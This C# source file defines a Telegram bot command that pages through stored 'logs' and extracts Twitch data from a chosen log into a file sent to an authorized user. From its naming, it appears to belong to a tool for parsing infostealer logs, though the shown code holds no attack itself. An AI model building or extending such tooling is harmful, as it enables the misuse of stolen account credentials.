using System.Text;
using Core.Parsers.Services;
using TelegramBot.Models;
using TelegramBot.Services;
using TL;
using WTelegram;

namespace TelegramBot.Commands.Services;

public class TwitchServiceCommand(Client client, DataService data, Random random) : ICommand, ICallbackCommand
{
    public bool AuthorizedOnly { get; } = true;

    // ◀️▶️
    public Task Invoke(UpdateNewMessage update, User user)
    {
        return client.Messages_SendMessage(
            user,
            "Twitch",
            random.NextInt64(),
            reply_markup: new ReplyInlineMarkup
            {
                rows = data.AvailableLogs(count: 5).Select(x => new KeyboardButtonRow
                    {
                        buttons = new KeyboardButtonBase[]
                        {
                            new KeyboardButtonCallback
                            {
                                text = x,
                                data = Encoding.UTF8.GetBytes(x),
                            }
                        }
                    })
                    .Append(new KeyboardButtonRow
                    {
                        buttons = new []
                        {
                            new KeyboardButtonCallback
                            {
                                text = "\u25b6\ufe0f",
                                data = new byte[] {1}
                            }
                        }
                    })
                    .ToArray()
            });
    }

    public async Task Invoke(UpdateBotCallbackQuery update, User user)
    {
        if (update.data is {Length:1})
        {
            var buttons = LogsToButtons(update.data[0]);
            
            await client.Messages_EditMessage(
                user,
                update.msg_id,
                reply_markup: new ReplyInlineMarkup
                {
                    rows = buttons
                        .Append(new KeyboardButtonRow
                        {
                            buttons = new[]
                            {
                                update.data[0] == 0 ? null : new KeyboardButtonCallback
                                {
                                    text = "\u25c0\ufe0f",
                                    data = new[] { (byte) (update.data[0] - 1) }
                                },
                                buttons.Count() == 5 ? new KeyboardButtonCallback
                                {
                                    text = "\u25b6\ufe0f",
                                    data = new[] { (byte) (update.data[0] + 1) }
                                } : null
                            }.Where(x => x is not null).ToArray()
                        })
                        .ToArray()
                });
            
            return;
        }

        var logspath = data.GetLogsPath(Encoding.UTF8.GetString(update.data));
        var filepath = await data.SaveAsync(
            logspath[(logspath.LastIndexOf('\\') + 1)..],
            logspath.TwitchFromLogs(),
            name: "Twitch");

        await data.SendFileAsync(user, filepath);
    }

    private IEnumerable<KeyboardButtonRow> LogsToButtons(int start = 0, int count = 5) 
        => data.AvailableLogs(start, count).Select(x => new KeyboardButtonRow
    {
        buttons = new []
        {
            new KeyboardButtonCallback
            {
                text = x,
                data = Encoding.UTF8.GetBytes(x)
            }
        }
    });
}